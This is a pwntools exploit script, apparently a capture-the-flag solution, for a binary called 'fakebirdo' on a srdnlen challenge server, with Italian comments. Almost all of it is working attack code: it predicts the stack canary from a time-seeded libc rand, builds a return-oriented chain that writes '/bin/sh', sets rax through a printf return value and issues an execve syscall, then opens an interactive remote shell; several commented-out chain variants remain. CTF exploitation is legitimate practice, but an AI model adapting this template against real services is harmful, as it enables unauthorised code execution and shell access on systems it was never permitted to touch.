#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["tmux", "splitw", "-hf"]
# context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './fakebirdo')
libc = CDLL(exe.libc.path)
host = args.HOST or 'fakebirdo.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x401307
continue
'''.format(**locals())

# -- Exploit goes here --

def get_canary():
    bird = 0
    for i in range(1,8):
        rax = (libc.rand() & 0xff) << (i << 3)
        bird |= rax
    return bird

# io = start()
# libc.srand(libc.time(0))
# canary = get_canary()
# log.info(f" {canary = :x}")


syscall = p64(0x4011ae)
printf = p64(0x401040)
dati = p64(0x404000)
scanf = p64(0x401070)
specifier = p64(0x402107)
# spec = p64(0x404070)
rdi = p64(0x401251)
rdx = p64(0x401255)
rsi = p64(0x401253)
rax = p64(0x401224)
rbp  = p64(0x40125e)
shell = p64(0x404049)
padding = b"A"*10 
stop = p64(0x4012fc)
adjust = p64(0x401307)

    # rax = 59      X
    # rdi = /bin/sh X
    # rsi = 0
    # rdx = 0

    # riscrivere luogo del rax con riprax


# UTILE
io = start()
libc.srand(libc.time(0))
canary = get_canary()
# print(i, "Canary: ", hex(canary))
test = []
# test.append(flat(padding , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell , scanf,
#                 rdi , specifier , rsi , dati , scanf,
#                 rdi, dati, printf,
#                 rdi,shell, rsi, 0, rdx, syscall))
# test.append(flat(padding , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell , scanf,
#                 rdi , specifier , rsi , dati , scanf, 
#                 rdi, dati, adjust, printf,
#                 rdi,shell, rsi, 0, rdx, syscall))
# test.append(flat(padding  , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell , scanf, 
#                 rdi , specifier , rsi , dati , adjust, scanf,
#                 rdi,  dati, printf,
#                 rdi,shell, rsi, 0, rdx, syscall))
# test.append(flat(padding , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell , scanf,
#                 rdi , specifier , rsi , dati , adjust,scanf,
#                 rdi, dati, adjust,printf, 
#                 rdi,shell, rsi, 0, rdx, syscall))
# test.append(flat(padding , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell ,adjust , scanf,
#                 rdi , specifier , rsi , dati , scanf,
#                 rdi, dati, printf,
#                 rdi,shell, rsi, 0, rdx, syscall))
# test.append(flat(padding , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell , adjust,scanf,
#                 rdi , specifier , rsi , dati , scanf,
#                 rdi, dati, adjust,printf,
#                 rdi,shell, rsi, 0, rdx, syscall))
# test.append(flat(padding , p64(canary) , b"A" * 8 , 
#                 rdi , specifier , rsi , shell ,adjust , scanf,
#                 rdi , specifier , rsi , dati , adjust, scanf, 
#                 rdi, dati, printf,
#                 rdi,shell, rsi, 0, rdx, syscall))
test.append(flat(padding , p64(canary) , b"A" * 8 , 
                rdi , specifier , rsi , shell ,adjust , scanf, # scanf /bin/sh
                rdi , specifier , rsi , dati , adjust, scanf, # scanf per rax
                rdi, dati, adjust ,printf, # setto rax
                rdi,shell, rsi, 0, rdx, syscall)) # system call


# print(test[0])
io.sendlineafter(b"> ", test[-1])
io.sendline(b"/bin/sh")
io.sendline(b"A%58c")

io.interactive()

